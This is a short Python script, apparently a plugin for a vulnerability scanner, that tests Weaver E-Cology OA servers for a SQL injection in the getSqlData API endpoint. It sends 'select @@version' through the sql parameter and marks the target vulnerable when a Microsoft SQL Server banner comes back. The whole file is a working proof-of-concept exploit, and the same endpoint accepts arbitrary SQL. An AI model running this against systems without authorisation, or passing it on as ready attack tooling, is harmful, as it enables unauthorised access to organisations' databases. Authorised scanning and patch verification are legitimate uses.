import requests
import urllib

def verify(url):
    relsult = {
        'name': 'Weaver-E-Cology-getSqlData-sqli',
        'vulnerable': False,
        'url': url,
        'about': 'https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20getSqlData%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md'
    }
    timeout = 3
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    vurl = urllib.parse.urljoin(url, '/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version')
    try:
        rep = requests.get(vurl, headers=headers, timeout=timeout)
        if rep.status_code == 200 and 'Microsoft SQL Server' in rep.text and 'status":true' in rep.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult
    except:
        return relsult